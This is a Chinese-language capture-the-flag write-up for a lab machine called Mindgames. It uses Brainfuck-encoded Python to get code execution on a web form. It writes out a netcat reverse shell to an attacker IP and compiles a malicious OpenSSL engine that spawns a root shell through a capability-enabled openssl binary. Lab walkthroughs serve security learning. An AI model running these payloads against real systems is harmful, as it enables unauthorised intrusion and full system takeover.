# Mindgames

Just a terrible idea...

---

## 端口扫描

循例 nmap扫：

    22/tcp open  ssh
    80/tcp open  http

进web看，brainfuck，和brainfuck的执行框

## brainfuck

将斐波那契的brainfuck拿去解密：

    def F(n):
        if n <= 1:
            return 1
        return F(n-1)+F(n-2)


    for i in range(10):
        print(F(i))

一段熟悉的python

现在我们编写一段poc:

    import os

    os.system('whoami')

将其进行brainfuck加密，然后在执行框中执行，成功返回：

    mindgames

## Reverse shell

通过刚刚的poc，我发现netcat是可用的，故利用netcat getshell:

    import os

    os.system('mkfifo /tmp/f1;nc 10.14.39.48 8888 < /tmp/f1 | /bin/bash > /tmp/f1')

将这段代码进行brainfuck加密，即可getshell成功

## 升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"

user.txt在mindgames的home下：

    mindgames@mindgames:~$ cat ./user.txt

## 权限提升

getcap -r / 2>/dev/null 发现openssl具备了suid，翻看垃圾桶

    #include <openssl/engine.h>

    static int bind(ENGINE *e, const char *id)
    {
        setuid(0);
        system("/bin/sh");
    return 1;
    }

    IMPLEMENT_DYNAMIC_BIND_FN(bind)
    IMPLEMENT_DYNAMIC_CHECK_FN()

安装openssllib：

    apt-get install libssl-dev

编译c:

    gcc -fPIC -o getroot.o -c ./test1.c
    gcc -shared -o getroot.so -lcrypto ./getroot.o

运行：

    openssl req -engine ./getroot.so

成功getroot，root.txt在/root下
